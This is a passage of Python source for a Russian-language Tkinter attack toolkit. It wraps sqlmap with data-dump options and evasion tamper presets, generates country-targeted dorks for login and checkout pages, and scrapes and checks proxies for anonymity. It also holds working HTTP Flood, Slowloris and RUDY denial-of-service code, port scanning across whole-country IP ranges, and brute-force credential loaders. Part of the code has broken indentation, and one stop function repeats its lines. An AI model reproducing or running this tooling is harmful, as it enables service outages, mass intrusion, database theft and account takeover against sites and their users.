        self.brute_stop_btn = ttk.Button(btn_frame, text="Стоп", command=self.stop_brute, state="disabled")
        self.brute_stop_btn.pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Сохранить", command=self.save_brute_results).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Очистить", command=self.clear_brute_results).pack(side="left", padx=5)

    def setup_sqlmap_ui(self):
        frame = self.frames["sqlmap"]
        main_frame = ttk.Frame(frame, padding=10)
        main_frame.pack(fill="both", expand=True)
        main_frame.columnconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        left_frame = ttk.Frame(main_frame)
        left_frame.grid(row=0, column=0, sticky="nsw")
        right_frame = ttk.Frame(main_frame)
        right_frame.grid(row=0, column=1, sticky="nse", padx=10)
        left_frame.columnconfigure(0, weight=1)
        right_frame.columnconfigure(0, weight=1)
        self.sqlmap_output_log = scrolledtext.ScrolledText(right_frame, width=60, height=25, bg=ENTRY_BG, fg=FG_COLOR, state="disabled")
        self.sqlmap_output_log.grid(row=1, column=0, pady=5, sticky="nsew")
        self.sqlmap_error_log = scrolledtext.ScrolledText(right_frame, width=60, height=10, bg=ENTRY_BG, fg=FG_COLOR, state="disabled")
        self.sqlmap_error_log.grid(row=3, column=0, pady=5, sticky="nsew")
        ttk.Label(right_frame, text="Лог:").grid(row=0, column=0, sticky="w")
        ttk.Label(right_frame, text="Ошибки:").grid(row=2, column=0, sticky="w")
        right_frame.rowconfigure(1, weight=2)
        right_frame.rowconfigure(3, weight=1)
        self.add_context_menu([self.sqlmap_output_log, self.sqlmap_error_log])
        self.sqlmap_notebook = ttk.Notebook(left_frame)
        self.sqlmap_notebook.grid(row=0, column=0, sticky="nsew")
        self.setup_sqlmap_tabs(left_frame, right_frame)

    def setup_sqlmap_tabs(self, left_frame, right_frame):
        tabs = [
            ("Сайты", self.setup_sqlmap_sites_tab),
            ("Настройки", self.setup_sqlmap_basic_tab),
            ("Прокси", self.setup_sqlmap_proxy_tab),
            ("Поиск сайтов", self.setup_sqlmap_parser_tab),
            ("Базы данных", self.setup_sqlmap_db_tab),
            ("Дорки", self.setup_sqlmap_dorks_tab),
        ]
        self.sqlmap_tab_frames = {}
        for name, setup_func in tabs:
            tab = ttk.Frame(self.sqlmap_notebook)
            self.sqlmap_notebook.add(tab, text=name)
            self.sqlmap_tab_frames[name] = tab
            setup_func(tab)
        buttons = [
            ("Проверить все сайты", self.sqlmap_run_sqlmap_all),
            ("Очистить сайты", self.sqlmap_clear_sites_list),
            ("Остановить", self.sqlmap_stop_sqlmap, "disabled"),
            ("Очистить логи", self.sqlmap_clear_logs)
        ]
        for i, (text, command, *state) in enumerate(buttons):
            btn = ttk.Button(left_frame, text=text, command=command)
            btn.grid(row=i+1, column=0, pady=10, sticky="ew")
            if state:
                btn.config(state=state[0])
            Tooltip(btn, text)
        self.sqlmap_stop_button = left_frame.winfo_children()[2]
        ttk.Label(left_frame, text="Прогресс:").grid(row=5, column=0, sticky="w")
        self.sqlmap_progress = ttk.Progressbar(left_frame, style="green.Horizontal.TProgressbar", variable=self.sqlmap_progress_value, maximum=100)
        self.sqlmap_progress.grid(row=6, column=0, sticky="ew", pady=5)
        ttk.Label(left_frame, textvariable=self.sqlmap_progress_label).grid(row=7, column=0, sticky="w")
        ttk.Label(left_frame, textvariable=self.sqlmap_current_ip).grid(row=8, column=0, pady=10, sticky="w")

    def setup_sqlmap_sites_tab(self, tab):
        ttk.Checkbutton(tab, text="Прокси для сканирования", variable=self.sqlmap_proxy_var_sqlmap).grid(row=0, column=0, columnspan=3, sticky="w", padx=5, pady=5)
        ttk.Label(tab, text="Добавить сайт:").grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.sqlmap_site_entry = ttk.Entry(tab, width=60)
        self.sqlmap_site_entry.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
        ttk.Button(tab, text="Добавить", command=self.sqlmap_add_site).grid(row=1, column=2, sticky="w", padx=5, pady=5)
        ttk.Button(tab, text="Загрузить из файла", command=self.sqlmap_load_sites_file).grid(row=2, column=0, columnspan=3, pady=5, sticky="ew")
        ttk.Button(tab, text="Удалить выбранный", command=self.sqlmap_remove_site).grid(row=3, column=0, columnspan=3, pady=5, sticky="ew")
        self.sqlmap_sites_listbox = tk.Listbox(tab, width=100, height=15, bg=ENTRY_BG, fg=FG_COLOR)
        self.sqlmap_sites_listbox.grid(row=4, column=0, columnspan=3, sticky="nsew", padx=5, pady=5)
        self.sqlmap_sites_listbox.bind("<Button-3>", self.sqlmap_show_site_menu)
        self.add_context_menu(self.sqlmap_sites_listbox)
        tab.columnconfigure(1, weight=1)
        tab.rowconfigure(4, weight=1)

    def setup_sqlmap_basic_tab(self, tab):
        self.sqlmap_presets = {
            "Быстро": {"method": "GET", "level": 1, "risk": 1, "techniques": "BE", "time_sec": 5, "tamper": "", "union_cols": "", "union_char": "NULL", "headers": ""},
            "Глубоко": {"method": "GET", "level": 3, "risk": 2, "techniques": "BEUST", "time_sec": 7, "tamper": "space2comment", "union_cols": "1-10", "union_char": "NULL", "headers": ""},
            "Полное": {"method": "POST", "level": 5, "risk": 3, "techniques": "BEUSTQ", "time_sec": 10, "tamper": "base64encode,space2comment", "union_cols": "1-20", "union_char": "random", "headers": ""}
        }
        self.sqlmap_preset_var = tk.StringVar(value="Быстро")
        self.sqlmap_preset_var.trace("w", self.sqlmap_update_basic_settings)
        fields = [
            ("Режим:", ttk.Combobox(tab, textvariable=self.sqlmap_preset_var, values=list(self.sqlmap_presets.keys()), state="readonly"), "Выберите режим"),
            ("URL:", ttk.Entry(tab, width=50), "Введите URL"),
            ("POST:", ttk.Entry(tab, width=50), "POST-параметры"),
            ("Заголовки:", ttk.Entry(tab, width=50), "Дополнительные заголовки"),
            ("Tamper:", ttk.Combobox(tab, values=self.sqlmap_tamper_scripts, width=50), "Скрипты обхода защиты")
        ]
        for i, (label, widget, tip) in enumerate(fields):
            ttk.Label(tab, text=label).grid(row=i, column=0, sticky="w", padx=5, pady=5)
            widget.grid(row=i, column=1, columnspan=2, sticky="ew", padx=5, pady=5)
            self.add_context_menu(widget)
            Tooltip(widget, tip)
            if label == "URL:": self.sqlmap_url_entry = widget
            elif label == "POST:": self.sqlmap_post_data_entry = widget
            elif label == "Заголовки:": self.sqlmap_headers_entry = widget
            elif label == "Tamper:": self.sqlmap_tamper_combobox = widget
        ttk.Button(tab, text="Дополнительно", command=self.sqlmap_show_advanced_settings).grid(row=len(fields), column=0, columnspan=3, pady=10, sticky="ew")
        self.sqlmap_update_basic_settings()
        tab.columnconfigure(1, weight=1)

    def setup_sqlmap_proxy_tab(self, tab):
        self.sqlmap_proxy_check_check = ttk.Checkbutton(tab, text="Прокси для проверки", variable=self.sqlmap_proxy_var_check, command=self.sqlmap_toggle_proxy_fields)
        self.sqlmap_proxy_check_check.grid(row=0, column=0, columnspan=3, sticky="w", padx=5, pady=5)
        ttk.Label(tab, text="Типы прокси:").grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.sqlmap_proxy_types_listbox = tk.Listbox(tab, selectmode="multiple", height=2, width=15)
        self.sqlmap_proxy_types_listbox.grid(row=1, column=1, sticky="w", padx=5, pady=5)
        for p_type in ["SOCKS4", "SOCKS5"]:
            self.sqlmap_proxy_types_listbox.insert(tk.END, p_type)
            self.sqlmap_proxy_types_listbox.selection_set(0, tk.END)
        self.sqlmap_proxy_types_listbox.bind("<<ListboxSelect>>", self.sqlmap_update_proxy_types)
        ttk.Label(tab, text="Тип использования:").grid(row=2, column=0, sticky="w", padx=5, pady=5)
        self.sqlmap_proxy_type_combobox = ttk.Combobox(tab, values=["SOCKS4", "SOCKS5"], width=10, state="readonly")
        self.sqlmap_proxy_type_combobox.grid(row=2, column=1, sticky="w", padx=5, pady=5)
        self.sqlmap_proxy_type_combobox.set("SOCKS5")
        ttk.Label(tab, text="Файл прокси:").grid(row=3, column=0, sticky="w", padx=5, pady=5)
        self.sqlmap_proxy_file_entry = ttk.Entry(tab, width=50)
        self.sqlmap_proxy_file_entry.grid(row=3, column=1, sticky="w", padx=5, pady=5)
        ttk.Button(tab, text="Обзор", command=self.sqlmap_load_proxy_file).grid(row=3, column=2, sticky="w", padx=5, pady=5)
        self.sqlmap_check_proxy_button = ttk.Button(tab, text="Проверить прокси", command=self.sqlmap_check_proxies)
        self.sqlmap_check_proxy_button.grid(row=4, column=0, padx=5, pady=10, sticky="ew")
        self.sqlmap_stop_proxy_button = ttk.Button(tab, text="Остановить", command=self.sqlmap_stop_proxy_check, state="disabled")
        self.sqlmap_stop_proxy_button.grid(row=4, column=1, padx=5, pady=10, sticky="ew")
        self.sqlmap_proxy_listbox = tk.Listbox(tab, width=50, height=10, bg=ENTRY_BG, fg=FG_COLOR)
        self.sqlmap_proxy_listbox.grid(row=5, column=0, columnspan=3, sticky="nsew", padx=5, pady=5)
        self.sqlmap_proxy_progress = ttk.Progressbar(tab, style="green.Horizontal.TProgressbar", maximum=100)
        self.sqlmap_proxy_progress.grid(row=6, column=0, columnspan=3, sticky="ew", pady=5)
        self.add_context_menu([self.sqlmap_proxy_types_listbox, self.sqlmap_proxy_type_combobox, self.sqlmap_proxy_file_entry, self.sqlmap_proxy_listbox])
        Tooltip(self.sqlmap_proxy_types_listbox, "Выберите типы прокси для проверки")
        tab.rowconfigure(5, weight=1)
        tab.columnconfigure(1, weight=1)
        self.sqlmap_toggle_proxy_fields()

    def setup_sqlmap_parser_tab(self, tab):
        ttk.Checkbutton(tab, text="Прокси для поиска", variable=self.sqlmap_proxy_var_parser).grid(row=0, column=0, columnspan=3, sticky="w", padx=5, pady=5)
        ttk.Button(tab, text="Начать поиск", command=self.sqlmap_run_parser_scan).grid(row=1, column=0, columnspan=3, pady=10, sticky="ew")
        ttk.Button(tab, text="Очистить", command=self.sqlmap_clear_parser_list).grid(row=2, column=0, columnspan=3, pady=10, sticky="ew")
        ttk.Label(tab, text="Прогресс:").grid(row=3, column=0, sticky="w", padx=5, pady=5)
        self.sqlmap_parser_progress = ttk.Progressbar(tab, style="green.Horizontal.TProgressbar", maximum=100)
        self.sqlmap_parser_progress.grid(row=4, column=0, columnspan=3, sticky="ew", padx=5)
        ttk.Label(tab, text="Найдено:").grid(row=5, column=0, sticky="w", padx=5, pady=5)
        self.sqlmap_parser_listbox = tk.Listbox(tab, width=80, height=15, bg=ENTRY_BG, fg=FG_COLOR)
        self.sqlmap_parser_listbox.grid(row=6, column=0, columnspan=3, sticky="nsew", padx=5, pady=5)
        self.add_context_menu(self.sqlmap_parser_listbox)
        tab.columnconfigure(0, weight=1)
        tab.rowconfigure(6, weight=1)

    def setup_sqlmap_db_tab(self, tab):
        ttk.Checkbutton(tab, text="Прокси для баз", variable=self.sqlmap_proxy_var_sqlmap).grid(row=0, column=0, columnspan=3, sticky="w", padx=5, pady=5)
        self.sqlmap_db_ops_combobox = ttk.Combobox(tab, values=["Найти базы", "Найти таблицы", "Найти колонки", "Слить данные", "Получить схему"], width=20, state="readonly")
        self.sqlmap_db_name_combobox = ttk.Combobox(tab, values=self.sqlmap_found_databases, width=30)
        self.sqlmap_table_name_entry = ttk.Entry(tab, width=30)
        self.sqlmap_save_file_entry = ttk.Entry(tab, width=30)
        self.sqlmap_export_format_combobox = ttk.Combobox(tab, values=["CSV", "JSON"], width=10, state="readonly")
        fields = [
            ("Действие:", self.sqlmap_db_ops_combobox, "Выберите действие"),
            ("База:", self.sqlmap_db_name_combobox, "Выберите базу"),
            ("Таблица:", self.sqlmap_table_name_entry, "Введите таблицу"),
            ("Сохранить:", self.sqlmap_save_file_entry, "Файл сохранения"),
            ("Формат:", self.sqlmap_export_format_combobox, "Формат данных")
        ]
        for i, (label, widget, tip) in enumerate(fields):
            ttk.Label(tab, text=label).grid(row=i, column=0, sticky="w", padx=5, pady=5)
            widget.grid(row=i, column=1, sticky="w", padx=5, pady=5)
            self.add_context_menu(widget)
            Tooltip(widget, tip)
        self.sqlmap_db_ops_combobox.set("Найти базы")
        self.sqlmap_export_format_combobox.set("CSV")
        ttk.Button(tab, text="Обзор", command=self.sqlmap_select_save_file).grid(row=3, column=2, sticky="w", padx=5, pady=5)
        tab.columnconfigure(1, weight=1)

    def setup_sqlmap_dorks_tab(self, tab):
        ttk.Label(tab, text="Ключевые слова:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.sqlmap_dorks_keywords = ttk.Entry(tab, width=50)
        self.sqlmap_dorks_keywords.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
        self.sqlmap_dorks_keywords.insert(0, "login,signup,admin,shop,cart,checkout,account")
        ttk.Label(tab, text="Страна:").grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.sqlmap_dorks_country = ttk.Combobox(tab, values=self.countries, state="readonly", width=50)
        self.sqlmap_dorks_country.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
        self.sqlmap_dorks_country.set("Выберите страну")
        ttk.Checkbutton(tab, text="Использовать прокси", variable=self.sqlmap_proxy_var_parser).grid(row=2, column=0, columnspan=2, sticky="w", padx=5, pady=5)
        ttk.Button(tab, text="Генерировать", command=self.sqlmap_generate_dorks).grid(row=3, column=0, pady=10, sticky="ew")
        ttk.Button(tab, text="Очистить", command=self.sqlmap_clear_dorks).grid(row=3, column=1, pady=10, sticky="ew")
        ttk.Button(tab, text="Экспорт", command=self.sqlmap_export_dorks).grid(row=4, column=0, columnspan=2, pady=10, sticky="ew")
        self.sqlmap_dorks_tree = ttk.Treeview(tab, columns=("Dork", "Status", "Select"), show="headings", height=15)
        self.sqlmap_dorks_tree.heading("Dork", text="Дорк")
        self.sqlmap_dorks_tree.heading("Status", text="Статус")
        self.sqlmap_dorks_tree.heading("Select", text="Выбрать")
        self.sqlmap_dorks_tree.column("Dork", width=400)
        self.sqlmap_dorks_tree.column("Status", width=100)
        self.sqlmap_dorks_tree.column("Select", width=50)
        self.sqlmap_dorks_tree.grid(row=5, column=0, columnspan=2, sticky="nsew", padx=5, pady=5)
        self.sqlmap_dorks_tree.bind("<Button-3>", lambda e: self.context_menu.post(e.x_root, e.y_root))
        tab.columnconfigure(1, weight=1)
        tab.rowconfigure(5, weight=1)

    async def fetch_source(self, session, url):
        try:
            async with session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=15) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get("Content-Type", "")
                    if "application/json" in content_type:
                        return await resp.json()
                    return await resp.text()
        except Exception as e:
            logging.warning(f"Ошибка {url}: {e}")
        return None

    async def fetch_proxies(self):
        proxies = set()
        selected_type = self.proxy_type_selected.get().lower()
        async with aiohttp.ClientSession() as session:
            tasks = [self.fetch_source(session, url) for url, ptype in PROXY_SOURCES]
            for (url, ptype), resp in zip(PROXY_SOURCES, await asyncio.gather(*tasks)):
                if not self.is_running or not resp:
                    continue
                if ptype != selected_type and selected_type != "all":
                    continue
                if isinstance(resp, dict) and "data" in resp:
                    for item in resp["data"]:
                        proxy = f"{item['ip']}:{item['port']}"
                        if re.match(r"(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}", proxy):
                            proxies.add((proxy, ptype))
                else:
                    if "proxyscrape" in url or "proxy-list.download" in url or "openproxylist" in url or url.endswith(".txt"):
                        for line in str(resp).splitlines():
                            if re.match(r"(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}", line):
                                proxies.add((line.strip(), ptype))
                    else:
                        soup = BeautifulSoup(str(resp), "html.parser")
                        for proxy in re.finditer(r"(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}", soup.get_text()):
                            proxies.add((proxy.group(), ptype))
                self.scraper_progress["value"] += 100 / len(PROXY_SOURCES)
                self.root.update()
        while not proxy_queue.empty():
            proxy_queue.get()
        for proxy, ptype in proxies:
            proxy_queue.put({"address": proxy, "type": ptype})

    def check_proxy(self, proxy):
        try:
            ip, port = proxy["address"].split(":")
            proxy_type = proxy["type"].lower()
            proxies = {}
            if proxy_type in ["http", "https"]:
                proxies = {proxy_type: f"{proxy_type}://{ip}:{port}"}
            elif proxy_type == "socks4":
                proxies = {"all": f"socks4://{ip}:{port}"}
            elif proxy_type == "socks5":
                proxies = {"all": f"socks5://{ip}:{port}"}
            start_time = time.time()
            response = requests.get(
                TEST_URL, proxies=proxies, timeout=self.timeout.get(),
                headers={"User-Agent": random.choice(USER_AGENTS)}
            )
            if response.status_code == 200:
                proxy["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
                return proxy
        except Exception as e:
            logging.error(f"Прокси {proxy['address']} невалиден: {e}")
        return None

    def scraper_worker(self):
        total = proxy_queue.qsize()
        checked = 0
        with ThreadPoolExecutor(max_workers=self.threads_count.get()) as executor:
            while self.is_running and not proxy_queue.empty():
                proxies = [proxy_queue.get() for _ in range(min(50, proxy_queue.qsize()))]
                for proxy, result in zip(proxies, executor.map(self.check_proxy, proxies)):
                    status = "Валиден" if result else "Невалиден"
                    proxy_data = {
                        "address": proxy["address"],
                        "type": proxy["type"],
                        "status": status,
                        "time": proxy.get("time", time.strftime("%Y-%m-%d %H:%M:%S"))
                    }
                    if self.scraper_filter.get() in ["Все", status]:
                        self.working_proxies.append(proxy_data)
                        self.checker_proxies.append(proxy_data)
                        self.scraper_tree.insert("", "end", values=(
                            proxy_data["address"], proxy_data["type"], proxy_data["status"], proxy_data["time"]
                        ))
                    checked += 1
                    self.scraper_progress["value"] = 50 + (checked / total * 50) if total else 50
                    self.scraper_status.config(text=f"Проверено: {checked}")
                    self.root.update()

    def start_scraping(self):
        if self.is_running:
            return
        if not self.proxy_type_selected.get():
            messagebox.showwarning("Ошибка", "Выберите тип прокси")
            return
        self.is_running = True
        self.scraper_start_btn["state"] = "disabled"
        self.scraper_stop_btn["state"] = "normal"
        self.scraper_progress["value"] = 0
        self.scraper_status.config(text="Сбор прокси...")
        threading.Thread(target=lambda: asyncio.run(self.fetch_proxies())).start()
        threading.Thread(target=self.scraper_worker, daemon=True).start()

    def stop_scraping(self):
        self.is_running = False
        self.scraper_start_btn["state"] = "normal"
        self.scraper_stop_btn["state"] = "disabled"
        self.scraper_status.config(text="Остановлено")

    def save_proxies(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt")
        if file_path:
            with open(file_path, "w") as f:
                for proxy in self.working_proxies:
                    if proxy["status"] == "Валиден":
                        f.write(f"{proxy['address']} {proxy['type']}\n")
            messagebox.showinfo("Успех", "Прокси сохранены")

    def load_proxies(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            self.checker_proxies.clear()
            self.checker_tree.delete(*self.checker_tree.get_children())
            with open(file_path, "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 2 and parts[1].lower() in ["http", "https", "socks4", "socks5"]:
                        self.checker_proxies.append({
                            "address": parts[0],
                            "type": parts[1],
                            "status": "Не проверен",
                            "time": time.strftime("%Y-%m-%d %H:%M:%S")
                        })
            for proxy in self.checker_proxies:
                self.checker_tree.insert("", "end", values=(
                    proxy["address"], proxy["type"], proxy["status"], proxy["time"]
                ))
            self.checker_status.config(text=f"Загружено: {len(self.checker_proxies)}")

    def checker_worker(self):
        total = len(self.checker_proxies)
        checked = 0
        selected_type = self.check_proxy_type_selected.get().lower()
        with ThreadPoolExecutor(max_workers=self.threads_count.get()) as executor:
            for proxy, result in zip(self.checker_proxies.copy(), executor.map(self.check_proxy, self.checker_proxies)):
                if not self.is_running:
                    break
                if proxy["type"].lower() != selected_type and selected_type != "all":
                    continue
                proxy["status"] = "Валиден" if result else "Невалиден"
                proxy["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
                self.checker_tree.delete(*self.checker_tree.get_children())
                for p in self.checker_proxies:
                    self.checker_tree.insert("", "end", values=(p["address"], p["type"], p["status"], p["time"]))
                checked += 1
                self.checker_progress["value"] = (checked / total * 100) if total else 0
                self.checker_status.config(text=f"Проверено: {checked}/{total}")
                self.root.update()

    def start_checking(self):
        if self.is_running or not self.checker_proxies:
            messagebox.showwarning("Ошибка", "Загрузите прокси для проверки")
            return
        if not self.check_proxy_type_selected.get():
            messagebox.showwarning("Ошибка", "Выберите тип прокси")
            return
        self.is_running = True
        self.checker_start_btn["state"] = "disabled"
        self.checker_stop_btn["state"] = "normal"
        self.checker_progress["value"] = 0
        self.checker_status.config(text="Проверка...")
        threading.Thread(target=self.checker_worker, daemon=True).start()

    def stop_checking(self):
        self.is_running = False
        self.checker_start_btn["state"] = "normal"
        self.checker_stop_btn["state"] = "disabled"
        self.checker_status.config(text="Остановлено")

    def clear_proxies(self):
        self.working_proxies.clear()
        self.checker_proxies.clear()
        self.scraper_tree.delete(*self.scraper_tree.get_children())
        self.checker_tree.delete(*self.checker_tree.get_children())
        self.scraper_status.config(text="Очищено")
        self.checker_status.config(text="Очищено")
        logging.info("Списки прокси очищены")

    async def dos_attack(self, url, attack_type, proxy=None):
        try:
            async with aiohttp.ClientSession() as session:
                headers = json.loads(self.dos_custom_headers.get()) if self.dos_custom_headers.get() else {}
                headers["User-Agent"] = random.choice(USER_AGENTS)
                path = f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}" if self.dos_random_path.get() else ""
                target = url + path
                if attack_type == "HTTP Flood":
                    async with session.get(target, headers=headers, proxy=proxy, timeout=self.timeout.get()) as resp:
                        status = "Успех" if resp.status == 200 else f"Ошибка {resp.status}"
                elif attack_type == "Slowloris":
                    async with session.get(target, headers=headers, proxy=proxy, timeout=30) as resp:
                        await asyncio.sleep(10)
                        status = "Успех"
                elif attack_type == "RUDY":
                    headers["Content-Length"] = "100000"
                    async with session.post(target, headers=headers, data=(b"a" * 10), proxy=proxy) as resp:
                        status = "Успех"
                else:
                    status = "Не поддерживается"
                self.dos_log.insert(tk.END, f"[{attack_type}] {target}: {status}\n")
                self.dos_log.see(tk.END)
                return status
        except Exception as e:
            logging.error(f"DoS ошибка {url}: {e}")
            self.dos_log.insert(tk.END, f"[{attack_type}] {url}: Ошибка {e}\n")
            self.dos_log.see(tk.END)
            return f"Ошибка {e}"

def dos_worker(self):
    url = self.target_url.get().strip()
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    total_requests = self.dos_requests.get()
    rate_limit = self.dos_rate_limit.get()
    proxies = [self.dos_proxy_listbox.get(i) for i in range(self.dos_proxy_listbox.size())]
    selected_attacks = [atype for atype, var in self.dos_attack_types.items() if var.get()]
    if not selected_attacks:
        messagebox.showwarning("Ошибка", "Выберите тип атаки")
        return
    completed = 0
    while self.dos_running and completed < total_requests:
        tasks = []
        for _ in range(self.dos_threads.get()):
            if completed >= total_requests:
                break
            attack_type = random.choice(selected_attacks)
            proxy = random.choice(proxies) if proxies and self.port_scan_use_proxy.get() else None
            tasks.append(self.dos_attack(url, attack_type, proxy))
            completed += 1
        asyncio.run(asyncio.gather(*tasks))
        self.dos_progress["value"] = (completed / total_requests) * 100
        self.dos_status.config(text=f"Выполнено: {completed}/{total_requests}")
        self.root.update()
        time.sleep(1 / rate_limit)
    self.stop_dos()

def start_dos(self):
    if self.dos_running or not self.target_url.get():
        messagebox.showwarning("Ошибка", "Введите цель")
        return
    self.dos_running = True
    self.dos_start_btn["state"] = "disabled"
    self.dos_stop_btn["state"] = "normal"
    self.dos_progress["value"] = 0
    self.dos_status.config(text="Атака начата...")
    threading.Thread(target=self.dos_worker, daemon=True).start()

def stop_dos(self):
    self.dos_running = False
    self.dos_start_btn["state"] = "normal"
    self.dos_stop_btn["state"] = "disabled"
    self.dos_status.config(text="Остановлено")

async def scan_port(self, ip, port, proxy=None):
    try:
        if self.port_scan_use_proxy.get() and proxy:
            proxy_type, proxy_addr = proxy.split("://")
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"http://ip-api.com/json/{ip}",
                    proxy=proxy,
                    timeout=self.timeout.get()
                ) as resp:
                    data = await resp.json()
                    return data
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout.get())
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                service = DANGEROUS_PORTS.get(port, {"name": "Unknown", "risk": "Unknown"})["name"]
                risk = DANGEROUS_PORTS.get(port, {"name": "Unknown", "risk": "Unknown"})["risk"]
                return {"ip": ip, "port": port, "status": "Открыт", "service": service, "risk": risk}
            return None
    except Exception as e:
        print(f"Ошибка при сканировании порта {port} для IP {ip}: {e}")
        logging.error(f"Ошибка сканирования {ip}:{port}: {e}")
        return None

def port_scan_worker(self):
    total = len(self.port_scan_targets) * len([port for port, var in self.port_selection.items() if var.get()])
    checked = 0
    proxies = [self.port_scan_proxy_listbox.get(i) for i in range(self.port_scan_proxy_listbox.size())]
    with ThreadPoolExecutor(max_workers=self.port_scan_threads.get()) as executor:
        for target in self.port_scan_targets:
            for port, var in self.port_selection.items():
                if not self.port_scan_running or not var.get():
                    continue
                proxy = random.choice(proxies) if proxies and self.port_scan_use_proxy.get() else None
                result = asyncio.run(self.scan_port(target, port, proxy))
                if result:
                    self.port_scan_results.append(result)
                    self.port_scan_tree.insert("", "end", values=(
                        result["ip"], result["port"], result["status"], result["service"], result["risk"]
                    ))
                checked += 1
                self.port_scan_progress["value"] = (checked / total * 100) if total else 0
                self.port_scan_status.config(text=f"Проверено: {checked}/{total}")
                self.root.update()
    self.stop_port_scan()

def start_port_scan(self):
    if self.port_scan_running or not self.port_scan_url.get():
        messagebox.showwarning("Ошибка", "Введите цель")
        return
    self.port_scan_targets = [self.port_scan_url.get().strip()]
    self.port_scan_running = True
    self.port_scan_start_btn["state"] = "disabled"
    self.port_scan_stop_btn["state"] = "normal"
    self.port_scan_progress["value"] = 0
    self.port_scan_status.config(text="Сканирование...")
    threading.Thread(target=self.port_scan_worker, daemon=True).start()

def stop_port_scan(self):
    self.port_scan_running = False
    self.port_scan_start_btn["state"] = "normal"
    self.port_scan_stop_btn["state"] = "disabled"
    self.port_scan_status.config(text="Остановлено")
    self.port_scan_running = False
    self.port_scan_start_btn["state"] = "normal"
    self.port_scan_stop_btn["state"] = "disabled"
    self.port_scan_status.config(text="Остановлено")

    def load_port_scan_targets(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            with open(file_path, "r") as f:
                self.port_scan_targets = [line.strip() for line in f if line.strip()]
            self.port_scan_status.config(text=f"Загружено: {len(self.port_scan_targets)} целей")

    def save_port_scan_results(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt")
        if file_path:
            with open(file_path, "w") as f:
                for result in self.port_scan_results:
                    f.write(f"{result['ip']}:{result['port']} - {result['status']} ({result['service']})\n")
            messagebox.showinfo("Успех", "Результаты сохранены")

    def clear_port_scan_results(self):
        self.port_scan_results.clear()
        self.port_scan_tree.delete(*self.port_scan_tree.get_children())
        self.port_scan_status.config(text="Очищено")

    def fetch_ip_ranges(self):
        country = self.selected_country.get()
        if not country or country == "Выберите страну":
            messagebox.showwarning("Ошибка", "Выберите страну")
            return
        try:
            response = requests.get(f"https://ipinfo.io/countries/{country.lower()}", timeout=10)
            if response.status_code == 200:
                self.ip_ranges = response.json().get("ranges", [])
                self.country_ip_ranges.delete(1.0, tk.END)
                self.country_ip_ranges.insert(tk.END, "\n".join(self.ip_ranges))
            else:
                messagebox.showerror("Ошибка", "Не удалось получить диапазоны")
        except Exception as e:
            logging.error(f"Ошибка получения диапазонов: {e}")
            messagebox.showerror("Ошибка", f"Ошибка: {e}")

    def ip_range_worker(self):
        total = sum(len(list(ipaddress.ip_network(range_))) for range_ in self.ip_ranges) * len([port for port, var in self.port_selection.items() if var.get()])
        checked = 0
        proxies = [self.ip_range_proxy_listbox.get(i) for i in range(self.ip_range_proxy_listbox.size())]
        with ThreadPoolExecutor(max_workers=self.ip_range_threads.get()) as executor:
            for ip_range in self.ip_ranges:
                for ip in ipaddress.ip_network(ip_range):
                    for port, var in self.port_selection.items():
                        if not self.ip_range_running or not var.get():
                            continue
                        proxy = random.choice(proxies) if proxies and self.ip_range_use_proxy.get() else None
                        result = asyncio.run(self.scan_port(str(ip), port, proxy))
                        if result:
                            self.ip_range_results.append(result)
                            self.ip_range_tree.insert("", "end", values=(result["ip"], result["port"]))
                        checked += 1
                        self.ip_range_progress["value"] = (checked / total * 100) if total else 0
                        self.ip_range_status.config(text=f"Проверено: {checked}/{total}")
                        self.root.update()
        self.stop_ip_range_scan()

    def start_ip_range_scan(self):
        if self.ip_range_running or not self.ip_ranges:
            messagebox.showwarning("Ошибка", "Загрузите диапазоны IP")
            return
        self.ip_range_running = True
        self.ip_range_start_btn["state"] = "disabled"
        self.ip_range_stop_btn["state"] = "normal"
        self.ip_range_progress["value"] = 0
        self.ip_range_status.config(text="Сканирование...")
        threading.Thread(target=self.ip_range_worker, daemon=True).start()

    def stop_ip_range_scan(self):
        self.ip_range_running = False
        self.ip_range_start_btn["state"] = "normal"
        self.ip_range_stop_btn["state"] = "disabled"
        self.ip_range_status.config(text="Остановлено")

    def save_ip_range_results(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt")
        if file_path:
            with open(file_path, "w") as f:
                for result in self.ip_range_results:
                    f.write(f"{result['ip']}:{result['port']}\n")
            messagebox.showinfo("Успех", "Результаты сохранены")

    def load_brute_targets(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            with open(file_path, "r") as f:
                self.brute_targets = [line.strip() for line in f if line.strip()]
            self.brute_status.config(text=f"Загружено: {len(self.brute_targets)} целей")

    def load_brute_logins(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            with open(file_path, "r") as f:
                self.brute_logins = [line.strip() for line in f if line.strip()]
            self.brute_status.config(text=f"Загружено: {len(self.brute_logins)} логинов")

    def load_brute_passwords(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            with open(file_path, "r") as f:
                self.brute_passwords = [line.strip() for line in f if line.strip()]
